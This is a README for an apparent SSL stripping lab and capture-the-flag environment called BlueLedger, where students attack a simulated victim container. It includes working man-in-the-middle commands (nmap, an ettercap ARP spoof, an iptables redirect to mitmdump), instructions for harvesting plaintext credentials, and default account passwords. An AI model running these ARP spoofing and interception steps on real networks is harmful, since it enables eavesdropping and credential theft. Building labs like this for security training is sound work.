# BlueLedger - SSL Stripping Lab Environment

A comprehensive SSL stripping laboratory with automated victim simulation and network discovery for cybersecurity education and CTF challenges.

## 🎓 **CTF Challenge Setup**

This environment is designed for cybersecurity education and Capture The Flag (CTF) exercises. Students will learn SSL stripping attacks, network reconnaissance, and credential harvesting techniques.

## 🚀 **Quick Start (2 Commands)**

### **Step 1: Network Setup**
```bash
./setup-macvlan.sh
```

### **Step 2: Start Lab Environment**
```bash
docker compose up
```

**What happens automatically:**
1. 🌐 Network auto-detection and macvlan configuration
2. 🖥️  BlueLedger server starts with authentication working
3. 🎭 Victim container gets real DHCP IP and simulates user traffic
4. 🔓 Ready for SSL stripping attacks!

## 🎯 **CTF Objectives**

### **Primary Goals:**
- **Reconnaissance**: Discover victim container IP using nmap
- **SSL Stripping**: Intercept HTTPS traffic and downgrade to HTTP
- **Credential Harvesting**: Capture login credentials in plaintext
- **Traffic Analysis**: Analyze captured network traffic

### **Learning Outcomes:**
- Understanding SSL/TLS vulnerabilities
- Network reconnaissance techniques
- Man-in-the-middle attack execution
- Traffic interception and analysis

## 🎭 **Lab Environment Components**

### **BlueLedger Server Container**
- **Host Network Access**: Available on host IP (e.g., 192.168.3.41)
- **Ports**: 3000 (Frontend), 5000 (HTTP API), 5001 (HTTPS API)
- **Full BlueLedger Application**: Complete chemical supply chain management system
- **Auto-Seeded Database**: Ready-to-use with default accounts
- **SSL/TLS Enabled**: Self-signed certificates for HTTPS

### **SSL Victim Container**
- **Macvlan Network**: Gets real DHCP IP from router (e.g., 192.168.3.77)
- **Auto-Discovery**: Finds BlueLedger server via network scanning
- **Realistic Traffic**: Login attempts every 30 seconds with jitter
- **Target for Attacks**: Perfect victim for SSL stripping demonstrations

## 🔐 **Default Credentials**

### **Application Login Accounts:**
- **Admin**: `admin@sinamoa.com` / `Admin123!@#`
- **Manager**: `manager@sinamoa.com` / `Manager123!@#`
- **Employee**: `employee@sinamoa.com` / `Employee123!@#`

### **Victim Simulation:**
- **Target Account**: `employee@sinamoa.com` / `Employee123!@#`
- **Attack Vector**: Victim container continuously attempts login via HTTPS

## � **CTF Challenge Steps**

### **Step 1: Network Reconnaissance**
```bash
# Discover victim container IP (it gets a random DHCP IP)
nmap -sn 192.168.3.0/24

# Alternative: Check ARP table
arp -a

# Look for container with different MAC address
# Victim IP will be something like 192.168.3.77 (varies)
```

### **Step 2: Verify Target Services**
```bash
# Scan victim for open ports
nmap -p- [VICTIM_IP]

# Verify BlueLedger server accessibility
curl -k https://192.168.3.41:5001/health
```

### **Step 3: SSL Stripping Attack**

**Method 1: MITMdump (Recommended)**
```bash
# Terminal 1: Start traffic capture
sudo mitmdump --mode transparent --ssl-insecure --showhost --set flow_detail=3

# Terminal 2: ARP spoof the victim
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /192.168.3.1//

# Terminal 3: Redirect HTTPS traffic to MITMdump
sudo iptables -t nat -A PREROUTING -s [VICTIM_IP] -p tcp --dport 5001 -j REDIRECT --to-port 8080
```

### **Step 4: Capture Credentials**
- **Watch MITMdump output** for TLS handshake failures followed by plaintext HTTP
- **Look for POST requests** to `/api/auth/login`
- **Extract credentials**: `{"email":"employee@sinamoa.com","password":"Employee123!@#"}`

### **Expected Results**
- **Victim logs**: Shows successful logins (200 responses)
- **MITMdump**: Captures plaintext credentials after SSL downgrade
- **Flag**: The captured password serves as the CTF flag

**📚 Complete guide**: `ssl-stripping-lab/SSL_Stripping_Lab_Guide_NEW.md`

## 🎓 **CTF Instructor Guide**

### **Customizing Credentials for Your Class**

**Method 1: Environment Variables (Recommended)**
```bash
# Edit docker-compose.yml and modify these environment variables:
environment:
  - JWT_SECRET=your-custom-jwt-secret-for-class
  - SEED_DATABASE=true
```

**Method 2: Database Seeding Script**
```bash
# Edit: blueledger-app/backend/scripts/seed-database.js
# Modify the users array with your custom credentials:

const users = [
  {
    email: 'admin@yourschool.edu',
    password: 'CustomAdmin2024!',
    role: 'admin'
  },
  {
    email: 'student@yourschool.edu',
    password: 'StudentFlag2024!',
    role: 'employee'
  }
];
```

### **Adding Intelligence Artifacts**

**Upload Files via Web Interface:**
1. Login as admin: `admin@sinamoa.com` / `Admin123!@#`
2. Navigate to **Admin Panel** → **File Management**
3. Upload documents, contracts, or intelligence files
4. Set appropriate access permissions per role

**Direct Database Insertion:**
```bash
# Connect to MongoDB container
docker exec -it blueledger_mongodb mongosh blueledger

# Insert custom documents
db.documents.insertOne({
  title: "Classified Chemical Formula",
  content: "FLAG{chemical_compound_x7y9z2}",
  classification: "TOP_SECRET",
  uploadedBy: "admin@sinamoa.com",
  accessLevel: "admin"
});
```

**File Upload via API:**
```bash
# Upload files programmatically
curl -X POST https://192.168.3.41:5001/api/admin/documents \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -F "file=@classified_document.pdf" \
  -F "classification=SECRET"
```

### **CTF Scoring Integration**

**Flag Locations:**
- **Primary Flag**: Employee password (`Employee123!@#`)
- **Secondary Flags**: Hidden in uploaded documents
- **Bonus Flags**: Database records, API responses, log files

**Verification Methods:**
```bash
# Check if students captured credentials
grep "employee@sinamoa.com" /var/log/mitmdump.log

# Verify document access
docker exec blueledger_mongodb mongosh --eval "db.accessLogs.find()"
```

---

# 📁 **Repository Structure**

```
BlueLedger/
├── 🔓 ssl-stripping-lab/          # SSL Stripping Laboratory
│   ├── containers/                # Container definitions
│   │   └── server_victim/         # Ubuntu server + Debian victim
│   ├── scripts/                   # Lab utility scripts
│   ├── docs/                      # Documentation
│   └── SSL_Stripping_Lab_Guide_NEW.md  # Complete lab guide
│
├── 🏢 blueledger-app/            # BlueLedger Web Application
│   ├── backend/                   # Node.js API server
│   ├── frontend/                  # React.js web interface
│   ├── database/                  # MongoDB initialization
│   ├── deploy/                    # Kubernetes/deployment configs
│   └── scripts/                   # Application utility scripts
│
├── docker-compose.yml             # Main lab environment
├── setup-macvlan.sh              # Network configuration script
└── README.md                      # This documentation
```

---

# 🏢 BlueLedger Application Features

A comprehensive web application for managing chemical supply chain operations, customer relationships, and business analytics for Synthalon - an advanced chemical used in biomedical applications.

## ✨ Features

### 🔐 Security & Authentication
- **JWT-based Authentication**: Secure login with JSON Web Tokens
- **Password Hashing**: bcrypt/Argon2 encryption for password security
- **Role-Based Access Control**: Admin, Manager, and Employee access levels
- **Session Management**: Secure user sessions with automatic logout
- **Input Validation**: Comprehensive data validation and sanitization

### 🏢 Business Management
- **CRM System**: Complete customer relationship management
- **Shipments Tracking**: Real-time import/export tracking
- **Contract Management**: Lifecycle management with renewals
- **Analytics Dashboard**: Business metrics and reporting
- **Admin Panel**: User management and system configuration

### 💼 Technical Features
- **RESTful API**: Clean, documented API endpoints
- **Real-time Updates**: WebSocket integration for live data
- **Mobile Responsive**: Optimized for all device sizes
- **Data Export**: PDF and Excel export capabilities
- **Audit Logging**: Complete activity tracking

## 🗄️ Database Schema

### Core Entities
- **Users**: Authentication and role management
- **Customers**: Client information and contact details
- **Shipments**: Import/export tracking and documentation
- **Contracts**: Agreement lifecycle management
- **Analytics**: Business intelligence and reporting data

### Relationships
- Users can manage multiple customers and contracts
- Shipments are linked to specific customers and contracts
- Analytics aggregate data across all entities

## 🛠️ Tech Stack

### Backend
- **Runtime**: Node.js 18+ with Express.js framework
- **Database**: MongoDB 7.0 with Mongoose ODM
- **Authentication**: JWT with bcrypt password hashing
- **Validation**: Joi schema validation
- **Security**: Helmet.js, CORS, rate limiting
- **Logging**: Winston with structured logging

### Frontend
- **Framework**: React 18+ with functional components
- **State Management**: React Context API + useReducer
- **Routing**: React Router v6
- **UI Components**: Material-UI (MUI) design system
- **Forms**: Formik with Yup validation
- **HTTP Client**: Axios with interceptors

### DevOps & Deployment
- **Containerization**: Docker with multi-stage builds
- **Orchestration**: Docker Compose, Kubernetes support
- **Reverse Proxy**: Nginx with SSL termination
- **Monitoring**: Health checks and logging
- **Security**: SSL/TLS encryption, security headers

## ⚙️ **Current Configuration**

### **Environment Variables (Auto-Configured)**
```env
# Database (MongoDB container)
MONGODB_URI=mongodb://blueledger_mongodb:27017/blueledger

# Authentication (Fixed for CTF)
JWT_SECRET=your-super-secure-jwt-secret-key-change-in-production
JWT_EXPIRE=24h
BCRYPT_ROUNDS=12

# Server Configuration
NODE_ENV=development
PORT=5000
HTTPS_PORT=5001
FRONTEND_URL=http://localhost:3000

# Auto-Seeding (Enabled)
SEED_DATABASE=true
```

### **Network Configuration (Auto-Detected)**
```env
# Created by setup-macvlan.sh
NETWORK_INTERFACE=wlo1              # Your WiFi interface
NETWORK_GATEWAY=192.168.3.1         # Your router IP
NETWORK_SUBNET=192.168.3.0/24       # Your network subnet
```

## 🚀 **Prerequisites & Setup**

### **System Requirements:**
- **Docker & Docker Compose** (recommended)
- **Linux host** with network interface access
- **Root privileges** for network configuration
- **nmap, ettercap, mitmdump** for SSL stripping attacks

### **Quick Setup:**
```bash
# 1. Clone repository
git clone <repository-url>
cd BlueLedger

# 2. Configure network
./setup-macvlan.sh

# 3. Start lab environment
docker compose up

# 4. Access applications
# Frontend: http://192.168.3.41:3000
# API: https://192.168.3.41:5001
```

### **Development Mode (Optional):**
```bash
# Backend development
cd blueledger-app/backend
npm install && npm run dev

# Frontend development (new terminal)
cd blueledger-app/frontend
npm install && npm start
```

## 📊 API Documentation

### Authentication Endpoints
- `POST /api/auth/login` - User login
- `POST /api/auth/register` - User registration
- `GET /api/auth/me` - Get current user
- `POST /api/auth/logout` - User logout

### Business Endpoints
- `GET /api/crm/customers` - List all customers
- `POST /api/crm/customers` - Create new customer
- `GET /api/shipments` - List shipments with filtering
- `POST /api/contracts` - Create new contract
- `GET /api/analytics/dashboard` - Dashboard metrics

### Admin Endpoints
- `GET /api/admin/users` - User management
- `POST /api/admin/users` - Create user accounts
- `GET /api/admin/system` - System statistics

## 🔒 Security Features

### Application Security
- **Authentication**: JWT tokens with configurable expiration
- **Authorization**: Role-based access control (RBAC)
- **Password Security**: bcrypt hashing with configurable rounds
- **Input Validation**: Server-side validation with Joi schemas
- **Rate Limiting**: Configurable request rate limiting
- **CORS Protection**: Configurable cross-origin resource sharing
- **Security Headers**: Helmet.js security headers
- **SQL Injection Prevention**: MongoDB with parameterized queries

### Network Security
- **HTTPS**: SSL/TLS encryption for all communications
- **Security Headers**: CSP, HSTS, X-Frame-Options
- **Session Security**: Secure cookie configuration
- **API Security**: Request validation and sanitization

## 📈 Monitoring & Logging

### Application Monitoring
- Health check endpoint (`/health`)
- Request logging with Winston
- Error tracking and reporting
- Performance metrics

### Security Monitoring
- Authentication attempt logging
- Failed request tracking
- Suspicious activity detection
- Audit trail maintenance

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🆘 Support

- 📚 **Documentation**: Complete guides in `ssl-stripping-lab/` directory
- 🐛 **Issues**: Report bugs via GitHub Issues
- 💬 **Discussions**: Community support via GitHub Discussions
- 📧 **Contact**: For security issues, contact the maintainers directly

## 🎓 **Educational Objectives**

### **Learning Outcomes:**
- **SSL/TLS Security**: Understanding encryption vulnerabilities and downgrade attacks
- **Network Reconnaissance**: Using nmap and network discovery techniques
- **Man-in-the-Middle Attacks**: ARP spoofing and traffic interception
- **Traffic Analysis**: Capturing and analyzing network communications
- **Web Application Security**: Authentication mechanisms and session management
- **Container Networking**: Docker networking and macvlan configuration

### **Skills Developed:**
- **Offensive Security**: SSL stripping, credential harvesting, network attacks
- **Defensive Security**: Traffic monitoring, intrusion detection, log analysis
- **Network Engineering**: Container networking, DHCP, routing configuration
- **Web Development**: Understanding modern web application architecture

### **CTF Integration:**
- **Realistic Environment**: Production-like application with real vulnerabilities
- **Scalable Challenges**: Easily customizable for different skill levels
- **Automated Scoring**: Integration with CTF platforms via API endpoints
- **Team Collaboration**: Multi-container environment supports team exercises

Perfect for **cybersecurity courses**, **penetration testing training**, **network security labs**, and **capture-the-flag competitions**.